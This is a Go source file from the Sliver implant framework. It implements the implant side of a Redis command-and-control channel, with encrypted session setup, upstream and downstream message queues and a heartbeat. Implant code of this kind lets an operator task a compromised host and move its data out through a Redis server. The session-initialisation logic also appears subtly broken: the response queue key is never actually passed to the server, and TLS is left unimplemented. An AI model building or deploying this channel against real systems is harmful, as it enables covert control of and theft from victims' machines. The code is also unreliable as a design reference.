package redisclient

/*
	Sliver Implant Framework
	Copyright (C) 2024  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeRedis}}

import (
	"context"
	"errors"
	"fmt"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/go-redis/redis/v8"
	"google.golang.org/protobuf/proto"
)

var (
	ErrClosed               = errors.New("redis session closed")
	ErrTimeout              = errors.New("redis operation timeout")
	ErrSessionInitFailed    = errors.New("redis session initialization failed")
	ErrInvalidSessionID     = errors.New("invalid session ID received")
)

// RedisOptions - Redis-specific configuration options
type RedisOptions struct {
	Addr            string        // Redis server address (host:port)
	Password        string        // Redis password
	DB              int           // Redis DB number (default 0)
	PollTimeout     time.Duration // Blocking pop timeout for receiving messages
	MaxErrors       int           // Max consecutive errors before giving up
	DialTimeout     time.Duration // Connection dial timeout
	ReadTimeout     time.Duration // Socket read timeout
	WriteTimeout    time.Duration // Socket write timeout
	TLSEnabled      bool          // Use TLS for Redis connection
}

// SliverRedisClient - Redis C2 client implementation
type SliverRedisClient struct {
	client      *redis.Client
	SessionID   string
	SessionCtx  *cryptography.CipherContext
	Options     *RedisOptions
	ctx         context.Context
	cancel      context.CancelFunc
	Closed      bool
	mutex       *sync.Mutex

	// Redis queue keys
	upstreamKey   string // Queue for implant -> server messages
	downstreamKey string // Queue for server -> implant messages
	heartbeatKey  string // Heartbeat key for session keepalive
}

// RedisStartSession - Initialize a new Redis C2 session
func RedisStartSession(addr string, opts *RedisOptions) (*SliverRedisClient, error) {
	// {{if .Config.Debug}}
	log.Printf("Starting Redis session to %s", addr)
	// {{end}}

	redisOpts := &redis.Options{
		Addr:         addr,
		Password:     opts.Password,
		DB:           opts.DB,
		DialTimeout:  opts.DialTimeout,
		ReadTimeout:  opts.ReadTimeout,
		WriteTimeout: opts.WriteTimeout,
	}

	// TODO: Add TLS support if opts.TLSEnabled

	client := redis.NewClient(redisOpts)

	// Test connection
	ctx, cancel := context.WithTimeout(context.Background(), opts.DialTimeout)
	defer cancel()

	if err := client.Ping(ctx).Err(); err != nil {
		// {{if .Config.Debug}}
		log.Printf("Redis ping failed: %v", err)
		// {{end}}
		return nil, err
	}

	sessionCtx, sessionCancel := context.WithCancel(context.Background())

	rc := &SliverRedisClient{
		client:  client,
		Options: opts,
		ctx:     sessionCtx,
		cancel:  sessionCancel,
		mutex:   &sync.Mutex{},
		Closed:  false,
	}

	// Initialize encrypted session with server
	if err := rc.SessionInit(); err != nil {
		// {{if .Config.Debug}}
		log.Printf("Redis session init failed: %v", err)
		// {{end}}
		rc.CloseSession()
		return nil, err
	}

	// {{if .Config.Debug}}
	log.Printf("Redis session initialized: %s", rc.SessionID)
	// {{end}}

	return rc, nil
}

// SessionInit - Establish encrypted session with server using Age key exchange
func (r *SliverRedisClient) SessionInit() error {
	// Generate random symmetric key for this session
	sKey := cryptography.RandomSymmetricKey()
	r.SessionCtx = cryptography.NewCipherContext(sKey)

	// Create session init protobuf message
	redisSessionInit := &pb.HTTPSessionInit{Key: sKey[:]} // Reuse HTTPSessionInit protobuf
	data, err := proto.Marshal(redisSessionInit)
	if err != nil {
		return err
	}

	// Encrypt session key using Age X25519 key exchange
	encryptedSessionInit, err := cryptography.AgeKeyExToServer(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Age encryption failed: %v", err)
		// {{end}}
		return err
	}

	// Push encrypted init to server's initialization queue
	initKey := "sliver:init"
	initCtx, initCancel := context.WithTimeout(r.ctx, r.Options.WriteTimeout)
	defer initCancel()

	if err := r.client.RPush(initCtx, initKey, encryptedSessionInit).Err(); err != nil {
		// {{if .Config.Debug}}
		log.Printf("Redis RPUSH to init queue failed: %v", err)
		// {{end}}
		return err
	}

	// Wait for server to respond with encrypted session ID
	// Server creates a temporary response queue based on our client identifier
	// For simplicity, we use a response queue pattern
	responseKey := fmt.Sprintf("sliver:init:response:%d", time.Now().UnixNano())

	// Register our response key by adding metadata to init message
	metaKey := fmt.Sprintf("sliver:init:meta:%d", time.Now().UnixNano())
	r.client.Set(initCtx, metaKey, responseKey, 30*time.Second)

	// Block waiting for session ID response
	responseCtx, responseCancel := context.WithTimeout(r.ctx, r.Options.PollTimeout)
	defer responseCancel()

	result, err := r.client.BLPop(responseCtx, r.Options.PollTimeout, responseKey).Result()
	if err != nil {
		if err == redis.Nil || err == context.DeadlineExceeded {
			return ErrTimeout
		}
		// {{if .Config.Debug}}
		log.Printf("Redis BLPOP for session ID failed: %v", err)
		// {{end}}
		return err
	}

	// Result is [key, value] - we want the value
	if len(result) < 2 {
		return ErrInvalidSessionID
	}

	encryptedSessionID := []byte(result[1])

	// Decrypt session ID using our session cipher
	sessionIDData, err := r.SessionCtx.Decrypt(encryptedSessionID)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Session ID decryption failed: %v", err)
		// {{end}}
		return err
	}

	r.SessionID = string(sessionIDData)

	// Set up queue keys for this session
	r.upstreamKey = fmt.Sprintf("sliver:sessions:%s:upstream", r.SessionID)
	r.downstreamKey = fmt.Sprintf("sliver:sessions:%s:downstream", r.SessionID)
	r.heartbeatKey = fmt.Sprintf("sliver:sessions:%s:heartbeat", r.SessionID)

	// Start heartbeat goroutine
	go r.heartbeat()

	return nil
}

// WriteEnvelope - Send a protobuf envelope to the server
func (r *SliverRedisClient) WriteEnvelope(envelope *pb.Envelope) error {
	r.mutex.Lock()
	defer r.mutex.Unlock()

	if r.Closed {
		return ErrClosed
	}

	// Serialize envelope to protobuf
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Envelope marshal failed: %v", err)
		// {{end}}
		return err
	}

	// Encrypt the serialized data
	encData, err := r.SessionCtx.Encrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Envelope encryption failed: %v", err)
		// {{end}}
		return err
	}

	// Push to upstream queue (server will pop from here)
	writeCtx, writeCancel := context.WithTimeout(r.ctx, r.Options.WriteTimeout)
	defer writeCancel()

	if err := r.client.RPush(writeCtx, r.upstreamKey, encData).Err(); err != nil {
		// {{if .Config.Debug}}
		log.Printf("Redis RPUSH to upstream failed: %v", err)
		// {{end}}
		return err
	}

	return nil
}

// ReadEnvelope - Receive a protobuf envelope from the server (blocking with timeout)
func (r *SliverRedisClient) ReadEnvelope() (*pb.Envelope, error) {
	if r.Closed {
		return nil, ErrClosed
	}

	// BLPOP blocks until message is available or timeout occurs
	// This mimics HTTP long polling behavior
	readCtx, readCancel := context.WithTimeout(r.ctx, r.Options.PollTimeout)
	defer readCancel()

	result, err := r.client.BLPop(readCtx, r.Options.PollTimeout, r.downstreamKey).Result()
	if err != nil {
		if err == redis.Nil || err == context.DeadlineExceeded {
			// Timeout - no message available, return nil to trigger retry
			return nil, nil
		}
		// {{if .Config.Debug}}
		log.Printf("Redis BLPOP from downstream failed: %v", err)
		// {{end}}
		return nil, err
	}

	// Result is [key, value]
	if len(result) < 2 {
		return nil, errors.New("invalid BLPOP result")
	}

	encData := []byte(result[1])

	// Decrypt the message
	data, err := r.SessionCtx.Decrypt(encData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Envelope decryption failed: %v", err)
		// {{end}}
		return nil, err
	}

	// Deserialize protobuf envelope
	envelope := &pb.Envelope{}
	if err := proto.Unmarshal(data, envelope); err != nil {
		// {{if .Config.Debug}}
		log.Printf("Envelope unmarshal failed: %v", err)
		// {{end}}
		return nil, err
	}

	return envelope, nil
}

// heartbeat - Periodically update session heartbeat
func (r *SliverRedisClient) heartbeat() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-r.ctx.Done():
			return
		case <-ticker.C:
			if r.Closed {
				return
			}

			// Update heartbeat key with TTL
			ctx, cancel := context.WithTimeout(r.ctx, 5*time.Second)
			r.client.Set(ctx, r.heartbeatKey, time.Now().Unix(), 60*time.Second)
			cancel()
		}
	}
}

// CloseSession - Gracefully close the Redis session
func (r *SliverRedisClient) CloseSession() error {
	r.mutex.Lock()
	defer r.mutex.Unlock()

	if r.Closed {
		return nil
	}

	r.Closed = true

	// Signal close to server
	if r.SessionID != "" {
		closeKey := fmt.Sprintf("sliver:sessions:%s:close", r.SessionID)
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		r.client.Set(ctx, closeKey, "1", time.Minute)
		cancel()
	}

	// Cancel context to stop heartbeat and other goroutines
	r.cancel()

	// Close Redis client
	if r.client != nil {
		return r.client.Close()
	}

	return nil
}

// {{end}}
